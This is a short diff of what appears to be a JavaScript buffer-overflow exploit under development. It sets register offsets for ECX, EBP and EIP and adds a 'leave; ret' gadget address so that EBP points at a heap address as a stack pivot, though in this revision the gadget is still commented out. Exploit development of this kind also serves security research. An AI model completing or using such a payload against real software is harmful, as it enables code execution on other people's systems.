@@ -40,6 +40,9 @@
       var offsetECX = 376;
       var offsetEBP = 388;
       var offsetEIP = 392;
+      // `leave; ret` at 0x6d74104e
+      // 0x7c3411a4
+      var leave_ret = "%a4%11%34%7c";
       var buf = "";
 
       for(i = 0; i <= offsetEIP; i+=4) {
@@ -48,10 +51,13 @@
          if(i === offsetECX)
             fill = "%43%43%43%43";
          else if(i === offsetEBP)
-            fill = "%42%42%42%42";
+            // ebp = 0x0a0a0000
+            // fill ebp register with heap address
+            fill = "%43%43%43%43";
          else if(i === offsetEIP)
             // jump to gadget `leave; ret`
-            fill = "%41%41%41%41";
+            // fill = leave_ret;
+            fill = "%42%42%42%42";
          else
             fill = "%41%41%41%41";
          
